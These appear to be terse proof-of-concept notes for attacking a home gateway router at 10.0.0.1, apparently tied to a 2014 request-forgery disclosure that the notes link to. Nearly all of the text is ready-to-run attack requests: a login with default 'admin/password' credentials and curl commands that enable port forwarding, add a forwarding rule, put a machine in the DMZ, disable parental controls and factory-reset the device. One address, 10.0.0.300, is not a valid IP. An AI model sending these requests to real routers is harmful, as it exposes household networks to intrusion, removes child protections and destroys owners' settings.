POST /goform/home_loggedout
Host: 10.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.0.0.1/
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cach

loginUsername=admin&loginPassword=password


------------------------------

GET http://10.0.0.1/connected_devices_computers.asp


Enable Port Forwarding:
curl -v http://10.0.0.1/goform/port_forwarding -d "forwarding=Enabled"

Add Port Forwarding:
curl -v http://10.0.0.1/goform/port_forwarding_add -d "storage_row=-1&common_services=other&other_service=Test Service&service_type=tcp_udp&server_ip_address_4=6&start_port=65534&end_port=65535"

Set a PC in the DMZ
curl http://10.0.0.1/goform/dmz -d "dmz=Enabled&dmz_host_value_4=200"

Disable parental control:
curl http://10.0.0.1/goform/managed_sites -d "EnableDisable=Disable"

Reset Factory Settings?
curl http://10.0.0.300/goform/restore_reboot -d "resetbt=rrbutton5"

http://sethsec.blogspot.com/2014/12/forging-my-way-into-xfinity-home.html
http://seclists.org/fulldisclosure/2014/Dec/57
http://seclists.org/fulldisclosure/2014/Dec/58
